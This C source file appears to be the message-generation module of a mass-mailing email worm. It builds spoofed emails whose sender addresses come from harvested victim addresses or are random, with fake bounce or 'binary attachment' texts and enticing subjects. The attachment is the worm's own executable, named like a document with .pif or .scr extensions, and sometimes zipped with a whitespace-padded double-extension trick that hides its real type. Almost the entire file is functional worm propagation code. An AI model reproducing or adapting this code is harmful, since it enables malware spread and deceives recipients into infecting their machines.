#include "includes.h"
#include "functions.h"
#include "externs.h"

/*
 *  Sync's message generator
 */

#ifndef NO_EMAIL

/* state structure */
struct msgstate_t {
	char *to, from[256], subject[128];
	char exe_name[32], exe_ext[16];
	char zip_used, zip_nametrick, is_tempfile;
	char attach_name[256];
	char attach_file[MAX_PATH];
	int attach_size;		/* in bytes */
	char mime_boundary[128];
	char *buffer;
	int buffer_size;
};

/* FIXME: must check "To:" != "From:" */
static void select_from(struct msgstate_t *state)
{
	static const char *step3_domains[] = {
		"aol.com", "msn.com", "yahoo.com", "hotmail.com"
	};
	int i, j, n;
	struct mailq_t *mq;

	state->from[0] = 0;

	/* STEP1 */
	while (randnum(100) < 98) {
		for (n=0,mq=massmail_queue; mq; mq=mq->next, n++);
		if (n <= 3) break;
		j = rand32() % n;
		for (i=0,mq=massmail_queue; mq; mq=mq->next, i++)
			if (i == j) break;
		if (mq == NULL) break;
		lstrcpy(state->from, mq->to);
		return;
	}

	/* STEP 2: use any Outlook account. Not implemented yet. */

	/* STEP 3 */
	j = 3 + randnum(3);        /* username length; 3-5 chars */
	for (i=0; i<j; i++)
		state->from[i] = 'a' + randnum(26);
	state->from[i++] = '@';
	j = randnum((sizeof(step3_domains) / sizeof(step3_domains[0])));
	strcpy(state->from+i, step3_domains[j]);
}

static void select_exename(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *name;
	} names[] = {
		{ 30, "document" },
		{ 15, "readme" },
		{ 15, "doc" },
		{ 15, "text" },
		{ 10, "file" },
		{ 10, "data" },
		{ 5, "test" },
		{ 17, "message" },
		{ 17, "body" },
		{ 0, "" }
	};
	static const struct {
		char pref;
		const char *ext;
	} exts[] = {
		{ 50, "pif" },
		{ 50, "scr" },
		{ 15, "exe" },
		{ 5, "cmd" },
		{ 5, "bat" },
		{ 0, "" }
	};
	int i, j, tot;

	if (randnum(100) < 8) {
		j = 3 + randnum(5);
		for (i=0; i<j; i++)
			state->exe_name[i] = 'a' + (randnum(26));
		state->exe_name[i] = 0;
	} else {
		for (i=0, tot=1; names[i].pref != 0; i++) tot += names[i].pref;
		j = randnum(tot);
		for (i=0, tot=1; names[i].pref != 0; i++)
			if ((tot += names[i].pref) >= j) break;
		if (names[i].pref == 0) i = 0;
		strcpy(state->exe_name, names[i].name);
	}

	for (i=0, tot=1; exts[i].pref != 0; i++) tot += exts[i].pref;
	j = randnum(tot);
	for (i=0, tot=1; exts[i].pref != 0; i++)
		if ((tot += exts[i].pref) >= j) break;
	if (exts[i].pref == 0) i = 0;
	strcpy(state->exe_ext, exts[i].ext);

	wsprintf(state->attach_name, "%s.%s", state->exe_name, state->exe_ext);
}

static void select_subject(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *subj;
	} subjs[] = {
		{ 12, "" },
		{ 35, "test" },
		{ 35, "hi" },
		{ 35, "hello" },
		{ 8, "Mail Delivery System" },
		{ 8, "Mail Transaction Failed" },
		{ 8, "Server Report" },
		{ 10, "Status" },
		{ 10, "Error" },
		{ 0, "" }
	};
	int i, j, tot;

	if (randnum(100) < 5) {
		j = 3 + randnum(15);
		for (i=0; i<j; i++)
			state->subject[i] = 'a' + randnum(26);
		state->subject[i] = 0;
	} else {
		for (i=0, tot=1; subjs[i].pref != 0; i++) tot += subjs[i].pref;
		j = randnum(tot);
		for (i=0, tot=1; subjs[i].pref != 0; i++)
			if ((tot += subjs[i].pref) >= j) break;
		if (subjs[i].pref == 0) i = 0;
		strcpy(state->subject, subjs[i].subj);
	}

	i = randnum(100);
	if ((i >= 50) && (i < 85))
		CharUpperBuff(state->subject, 1);
	else if (i >= 85)
		CharUpper(state->subject);
}

static int select_attach_file(struct msgstate_t *state)
{
	HANDLE h;
	char buf[MAX_PATH];

	state->zip_used = 0;
	state->zip_nametrick = 0;
	if (randnum(100) < 64)
		state->zip_used = 1;

	if (state->zip_used == 0) {
		state->is_tempfile = 0;
		GetModuleFileName(NULL, state->attach_file, MAX_PATH);
	} else {
		state->is_tempfile = 1;
		buf[0] = 0;
		GetTempPath(MAX_PATH, buf);
		if (buf[0] == 0)
			return 1;
		state->attach_file[0] = 0;
		GetTempFileName(buf, "tmp", 0, state->attach_file);
		if (state->attach_file[0] == 0)
			return 1;
		GetModuleFileName(NULL, buf, MAX_PATH);

		state->zip_nametrick = 0;
		if (randnum(100) < 40)
			state->zip_nametrick = 1;

		if (state->zip_nametrick == 0) {
			if (zip_store(buf, state->attach_file, state->attach_name))
				return 1;
		} else {
			char zip_name[512];
			int i;

			lstrcpy(zip_name, state->exe_name);
			lstrcat(zip_name, ".");
			switch (randnum(5)) {
				case 0: lstrcat(zip_name, "doc"); break;
				case 1: case 2: lstrcat(zip_name, "htm"); break;
				default: lstrcat(zip_name, "txt"); break;
			}
			for (i=0; i<70; i++)
				lstrcat(zip_name, " ");
			lstrcat(zip_name, ".");
			switch (randnum(3)) {
				case 0: lstrcat(zip_name, "exe"); break;
				case 1: lstrcat(zip_name, "scr"); break;
				default: lstrcat(zip_name, "pif"); break;
			}
			
			if (zip_store(buf, state->attach_file, zip_name))
				return 1;
		}
		wsprintf(state->attach_name, "%s.zip", state->exe_name);
	}

	h = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == NULL || h == INVALID_HANDLE_VALUE) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}
	state->attach_size = GetFileSize(h, NULL);
	CloseHandle(h);

	if ((state->attach_size < 1024) || (state->attach_size > (300*1024))) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}

	return 0;
}

static void write_msgtext(struct msgstate_t *state, unsigned char *p)
{
	struct {
		int pref;
		char *text;
	} texts[] = {
		{ 20, "" },
		{ 5, "test" },
		{ 40, "The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment." },
		{ 40, "The message contains Unicode characters and has been sent as a binary attachment." },
		{ 20, "Mail transaction failed. Partial message is available." },
		{ 0, "" }
	};
	int i, j, w;

	if (randnum(100) < 20) {
		unsigned char c;
		w = 512 + randnum(2048);
		for (i=0; i<w;) {
			c = rand() & 0xFF;
			if (c < 32) continue;
			if (c == '=' || c == '+' || c == 255 || c == 127 || c == 128 || c == '@')
				continue;
		        p[i++] = c;
			if (randnum(70) == 0) {
				p[i++] = 13;
				p[i++] = 10;
			}
		}
		p[i] = 0;
		return;
	}

	for (i=0,w=1; texts[i].pref != 0; i++) w += texts[i].pref;
	j = randnum(w);
	for (i=0,w=1; texts[i].pref != 0; i++) if ((w += texts[i].pref) >= j) break;
	if (texts[i].pref == 0) i = 0;
	lstrcpy((LPSTR)p, texts[i].text);
}

static void base64_t2q(BYTE *t, BYTE *q)
{
	BYTE alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	q[0] = alpha[t[0] >> 2];
	q[1] = alpha[((t[0] & 03) << 4) | (t[1] >> 4)];
	q[2] = alpha[((t[1] & 017) << 2) | (t[2] >> 6)];
	q[3] = alpha[t[2] & 077];
}

static int msg_b64enc(char *outbuf, struct msgstate_t *state)
{
	HANDLE hIn;
	BYTE inbuf[1024], t[3], q[3];
	DWORD tp, inp, inlen, outp, i, linepos;
	const DWORD linelen = 76;

	hIn = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, NULL);
	if (hIn == INVALID_HANDLE_VALUE) return 1;

	for (tp=0, inp=0, inlen=0, outp=0, linepos=0;;) {
		if (inp >= inlen) {
			ReadFile(hIn, inbuf, sizeof(inbuf), &inlen, NULL);
			if (inlen == 0) break;
			inp = 0;
		}
		t[tp++] = inbuf[inp++];
		if (tp == 3) {
			base64_t2q(t, q);
			for (i=0; i<4; i++) {
				outbuf[outp++] = q[i];
				if (++linepos >= linelen) {
					outbuf[outp++] = '\r';
					outbuf[outp++] = '\n';
					linepos = 0;
				}
			}
			memset(t, 0, sizeof(t));
			tp = 0;
		}
	}

	if (tp) {
		base64_t2q(t, q);
		if (tp < 3) q[3] = '=';
		if (tp < 2) q[2] = '=';
		for (i=0; i<4; i++)
			outbuf[outp++] = q[i];
	}

	outbuf[outp] = 0;

	CloseHandle(hIn);
	return 0;
}

static void write_headers(struct msgstate_t *state)
{
	char *buf = state->buffer;

	wsprintf(state->mime_boundary, "----=_%s_%.3u_%.4u_%.8X.%.8X", "NextPart", 0, randnum(15), rand32(), rand32());

	sprintf(buf, "From: ");                              /*  */
	lstrcat(buf, state->from);
	sprintf(buf+lstrlen(buf), "\r\nTo: ");               /*  */
	lstrcat(buf, state->to);
	sprintf(buf+lstrlen(buf), "\r\nSubject: ");          /*  */
	lstrcat(buf, state->subject);

	sprintf(buf+lstrlen(buf), "\r\nDate: ");             /*  */
	mk_smtpdate(NULL, buf+lstrlen(buf));
	sprintf(buf+lstrlen(buf), "\r\nMIME-Version: 1.0");  /*  */
	sprintf(buf+lstrlen(buf), "\r\nContent-Type: multipart/mixed;\r\n");
	cat_wsprintf(buf, "\tboundary=\"%s\"", state->mime_boundary);
	sprintf(buf+lstrlen(buf), "\r\nX-Priority: 3");
	sprintf(buf+lstrlen(buf), "\r\nX-MSMail-Priority: Normal");

	lstrcat(buf, "\r\n\r\n");
}

static int write_body(struct msgstate_t *state)
{
	char *p = state->buffer;

	sprintf(p+lstrlen(p), "This is a multi-part message in MIME format.\r\n\r\n");

	cat_wsprintf(p, 
		"--%s\r\n"
		"Content-Type: text/plain;\r\n"
		"\tcharset=\"Windows-1252\"\r\n"
		"Content-Transfer-Encoding: 7bit\r\n\r\n",
		state->mime_boundary);

	write_msgtext(state, (unsigned char*)p+lstrlen(p));
	lstrcat(p, "\r\n\r\n\r\n");

	cat_wsprintf(p, 
		"--%s\r\n"
		"Content-Type: application/octet-stream;\r\n"
		"\tname=\"%s\"\r\n"
		"Content-Transfer-Encoding: base64\r\n"
		"Content-Disposition: attachment;\r\n"
		"\tfilename=\"%s\"\r\n\r\n", 
		state->mime_boundary, state->attach_name, state->attach_name);

	if (msg_b64enc(p+lstrlen(p), state))
		return 1;

	cat_wsprintf(p, "\r\n\r\n--%s--\r\n\r\n", state->mime_boundary);

	return 0;
}


/* Main function. Returns pointer to a buffer with generated buffer.
   Caller is responsible to free it using GlobalFree() */
char *msg_generate(char *email)
{
	struct msgstate_t state;

	if (email == NULL) return NULL;
	if (lstrlen(email) < 7) return NULL;		/* x@xx.xx */
	memset(&state, '\0', sizeof(state));

	state.to = email;
	select_from(&state);
	select_exename(&state);
	select_subject(&state);

	if (select_attach_file(&state))
		return NULL;

	state.buffer_size = 8096 + (4 * state.attach_size) / 3;
	state.buffer_size = (((state.buffer_size + 1023) / 1024)) * 1024;
	state.buffer = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, state.buffer_size);
	if (state.buffer == NULL) goto err;

	state.buffer[0] = 0;
	write_headers(&state);
	if (write_body(&state)) goto err;

	if (state.is_tempfile) DeleteFile(state.attach_file);
	return state.buffer;

err:
	if (state.is_tempfile) DeleteFile(state.attach_file);
	if (state.buffer != NULL) GlobalFree((HGLOBAL)state.buffer);
	return NULL;
}
#endif